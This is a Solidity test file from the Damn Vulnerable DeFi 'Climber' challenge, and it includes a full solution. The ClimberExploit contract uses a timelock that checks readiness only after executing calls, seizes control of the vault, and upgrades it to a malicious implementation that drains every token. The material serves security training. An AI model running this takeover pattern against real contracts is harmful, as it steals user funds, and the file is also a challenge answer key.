// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        // Bug: ClimberTimelock.execute() runs target calls BEFORE verifying
        // the operation is ReadyForExecution. We can use that order to:
        //   1) grant PROPOSER_ROLE to our helper
        //   2) set delay = 0
        //   3) have the helper schedule THIS exact op at runtime
        //      (so the state check at the end passes)
        //   4) transfer timelock's ADMIN powers to our helper → upgrade vault
        //      → drain tokens to recovery

        ClimberExploit exploit = new ClimberExploit(timelock, address(vault), token, recovery);
        exploit.attack();

        // Upgrade the vault's implementation to our malicious one and sweep
        DrainableVault drainable = new DrainableVault();
        exploit.upgradeAndDrain(address(drainable));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract DrainableVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    function sweep(address token, address to) external {
        DamnValuableToken(token).transfer(to, DamnValuableToken(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address) internal override {}
}

contract ClimberExploit {
    ClimberTimelock timelock;
    address vault;
    DamnValuableToken token;
    address recovery;

    address[] targets;
    uint256[] values;
    bytes[] data;
    bytes32 constant SALT = bytes32("SALT");

    constructor(ClimberTimelock _timelock, address _vault, DamnValuableToken _token, address _recovery) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;
    }

    function _buildOps() internal {
        targets.push(address(timelock));
        values.push(0);
        data.push(abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this)));

        targets.push(address(timelock));
        values.push(0);
        data.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        targets.push(vault);
        values.push(0);
        data.push(abi.encodeWithSignature("transferOwnership(address)", address(this)));

        targets.push(address(this));
        values.push(0);
        data.push(abi.encodeWithSignature("scheduleMyself()"));
    }

    function attack() external {
        _buildOps();
        timelock.execute(targets, values, data, SALT);
    }

    function scheduleMyself() external {
        timelock.schedule(targets, values, data, SALT);
    }

    function upgradeAndDrain(address newImpl) external {
        // We now own the vault (transferOwnership target was vault)
        (bool ok,) = vault.call(abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            newImpl,
            abi.encodeWithSignature("sweep(address,address)", address(token), recovery)
        ));
        require(ok, "upgrade failed");
    }
}
